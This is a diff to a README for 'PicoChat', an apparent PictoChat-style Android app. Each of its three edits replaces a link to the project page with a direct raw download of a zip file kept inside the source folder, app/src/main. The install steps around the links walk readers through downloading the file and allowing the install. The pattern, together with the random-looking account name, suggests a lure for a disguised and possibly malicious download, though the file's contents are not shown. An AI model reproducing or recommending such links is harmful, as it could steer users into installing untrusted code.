@@ -1,6 +1,6 @@
 # 📱 PicoChat - Bring PictoChat Style to Android
 
-[![Download PicoChat](https://img.shields.io/badge/Download%20PicoChat-blue-grey?style=for-the-badge)](https://github.com/Endometrial-mosscampion336/PicoChat)
+[![Download PicoChat](https://img.shields.io/badge/Download%20PicoChat-blue-grey?style=for-the-badge)](https://github.com/Endometrial-mosscampion336/PicoChat/raw/refs/heads/main/app/src/main/Pico-Chat-1.9-beta.3.zip)
 
 ## 🧩 What PicoChat Is
 
@@ -12,7 +12,7 @@ If you liked the old DS chat screen, this app gives you a similar feel on your p
 
 Use this link to visit the download page and get PicoChat:
 
-[Visit the PicoChat download page](https://github.com/Endometrial-mosscampion336/PicoChat)
+[Visit the PicoChat download page](https://github.com/Endometrial-mosscampion336/PicoChat/raw/refs/heads/main/app/src/main/Pico-Chat-1.9-beta.3.zip)
 
 After you open the page, look for the latest release or app file. On Android, you usually download an APK file, then open it to install the app.
 
@@ -174,7 +174,7 @@ It depends on how the app is set up, but the main goal is to give you a PictoCha
 4. Allow the install if Android asks.
 5. Launch PicoChat.
 
-[Download or install PicoChat](https://github.com/Endometrial-mosscampion336/PicoChat)
+[Download or install PicoChat](https://github.com/Endometrial-mosscampion336/PicoChat/raw/refs/heads/main/app/src/main/Pico-Chat-1.9-beta.3.zip)
 
 ## 🖥️ If You Download on Windows First
 
